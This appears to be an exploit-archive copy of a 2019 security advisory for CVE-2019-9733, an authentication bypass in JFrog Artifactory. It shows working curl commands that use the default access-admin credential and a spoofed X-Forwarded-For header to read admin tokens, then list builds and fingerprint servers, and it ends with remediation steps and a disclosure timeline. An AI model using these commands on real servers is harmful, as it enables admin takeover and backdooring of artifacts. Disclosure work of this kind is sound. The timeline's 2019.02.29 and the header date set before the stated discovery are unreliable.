@@ -1,0 +1,166 @@
+id: 32401
+date: 03/21/2019
+title: JFrog Artifactory Administrator Authentication Bypass Exploit
+author: CipherTechs
+cves: CVE-2019-9733
+
+JFrog Artifactory Administrator Authentication Bypass 
+
+
+Introduction
+============
+JFrog Artifactory (https://jfrog.com/artifactory/) is a popular universal artifact repository manager commonly used by software developers. CipherTechs' Red Team discovered a high risk vulnerability that allows unauthenticated remote attackers to obtain administrative access to Artifactory servers and assume control of all stored artifacts and builds. 
+
+
+CVE
+====
+CVE-2019-9733
+
+
+Affected Platforms and Versions
+===============================
+Product: JFrog Artifactory
+Version: < 6.8.6
+
+
+Vulnerability Overview
+======================
+Security risk: Critical
+Attack vector: Remote
+Vendor Status: Fixed in version 6.8.6 released March 12, 2019
+https://www.jfrog.com/confluence/display/RTF/Release+Notes#ReleaseNotes-Artifactory6.8.6
+
+
+Vulnerability Description
+=========================
+Artifactory has an account that can be used to reset the admin account password from localhost. 
+
+By providing the HTTP header ‘X-Forwarded-For’ it is possible to bypass Artifactory’s whitelist allowed_ips.
+
+Accessing the internal "password reset" admin account exposes the primary admin account's access token allowing an attacker to obtain admin access to the Artifactory server without disrupting other users' access.
+
+This vulnerability is exploitable in most configurations including when an external SSO provider such as Okta or Onelogin is used.
+
+
+Technical details
+=================
+
+Artifactory’s documentation [1] states that a default account, access-admin, is present and can be used to reset the admin user’s password. CipherTechs used curl to see if the access-admin account was present and had the default password of password.
+
+$ curl -ks -u access-admin:password https://artifactory.lan/artifactory/api/access/api/v1/users/ {
+  "errors" : [ {
+    "code" : "FORBIDDEN",
+    "message" : "User 'access-admin' is not allowed to login from remote address: [IP REDACTED]"
+  } ]
+}
+
+The error message shows that the credential access-admin:password is valid, but not allowed to login remotely. CipherTechs bypassed this measure by providing a X-Forwarded-For HTTP header and set it to 127.0.0.1 (localhost).
+
+$ curl -ks -H 'X-Forwarded-For: 127.0.0.1' -u access-admin:password https://artifactory.lan/artifactory/api/access/api/v1/users/  | jq .
+{
+  "users": [
+    {
+      "username": "access-admin",
+      "realm": "internal",
+      "status": "enabled",
+      "allowed_ips": [
+        "127.0.0.1"
+      ],
+      "created": "2019-01-19T20:00:40.327Z",
+      "modified": "2019-02-14T15:55:41.052Z",
+      "last_login_time": "1970-01-01T00:00:00.000Z",
+      "custom_data": {},
+      "password_expired": false,
+      "password_last_modified": 1518623741047,
+      "groups": []
+    },
+    {
+      "username": "admin",
+      "realm": "internal",
+      "status": "enabled",
+      "allowed_ips": [
+        "*"
+      ],
+      "created": "2019-01-19T20:01:09.806Z",
+      "modified": "2019-02-14T15:38:54.481Z",
+      "last_login_time": "2019-02-20T11:53:57.973Z",
+      "last_login_ip": "[REDACTED]",
+      "custom_data": {
+        "public_key": "[REDACTED]",
+        "updatable_profile": "true",
+        "basictoken_shash": "[REDACTED]",
+        "private_key": "[REDACTED]",
+        "artifactory_admin": "true",
+        "basictoken": "[REDACTED]"
+      },
+      "password_expired": false,
+      "password_last_modified": 1518623741101,
+      "groups": []
+
+[ CIPHERTECHS: LONG RESPONSE REMOVED FOR BREVITY. All users, keys, and tokens are returned]
+
+ 
+Once authenticated as admin, the full rich Artifactory API was available [2] and yielded sensitive details. For example, the following request retrieves all builds.
+
+$ curl -H"Authorization: Bearer $basictoken_value" -ks https://artifactory.lan/artifactory/api/builds/
+
+The admin account has rights to publish artifacts and can overwrite existing files, making it possible for an attacker to backdoor existing artifacts that current and future builds depend on and giving persistent access across all environments and developer workstations.
+
+Artifactory servers can be discovered by requesting the URI /artifactory/webapp/ and looking for the X-Artifactory-Id HTTP response header.
+
+$ curl -I https://artifactory.lan/artifactory/webapp/
+HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Cache-Control: no-store,max-age=0
+Cache-control: no-cache="set-cookie"
+Content-Length: 2239
+Content-Type: text/html
+Date: Mon, 23 Feb 2019 17:24:08 GMT
+ETag: W/"2239-1549437200000"
+Last-Modified: Wed, 06 Feb 2019 07:13:20 GMT
+Server: Artifactory/6.7.3
+X-Artifactory-Id: d9b50a320385a5e306762e0c0a88ad4f6fe1527b
+X-Artifactory-Node-Id: artifactory-node-1
+X-FRAME-OPTIONS: DENY
+Connection: keep-alive
+
+
+Recommendations
+===============
+Upgrade to JFrog Artifactory 6.8.6 or higher. 
+
+Change the default access-admin password. 
+
+Block external access to /api.
+
+Review Artifactory logs for previous API use and any signs of access from unauthorized IP addresses.
+
+Revoke basic tokens for all users. The example command below will revoke the basic token for the access-admin account.
+curl -H "Content-Type: application/json+merge-patch" -XPATCH -uaccess-admin --data '{"username":"admin","custom_data":{"basictoken_shash":{"value":"REDACTED","sensitive":false},"basictoken":{"value":"","sensitive":true}}}' https://artifactory.lan/artifactory/api/v1/users/admin
+
+
+
+
+Timeline
+=========
+2019.02.25 - Vulnerability discovered by CipherTechs
+2019.02.28 - JFrog notified 
+2019.02.29 - JFrog provided interim fix for CipherTechs' client and began working on a patch.
+2019.03.12 - Fixed version of Artifactory published at https://www.jfrog.com/confluence/display/RTF/Release+Notes#ReleaseNotes-Artifactory6.8.6
+2019.03.21 - Public disclosure
+
+
+Credits
+=======
+CipherTechs Red Team
+
+CipherTechs would like to thank JFrog for their professional response to this vulnerability disclosure.
+
+
+References:
+[1] https://www.jfrog.com/confluence/display/RTF/Managing+Users
+[2] https://www.jfrog.com/confluence/display/RTF/Artifactory+REST+API
+
+The contents of this advisory are Copyright(c) 2019 CipherTechs Inc.
+
+#  0day.today [2023-03-23]  #
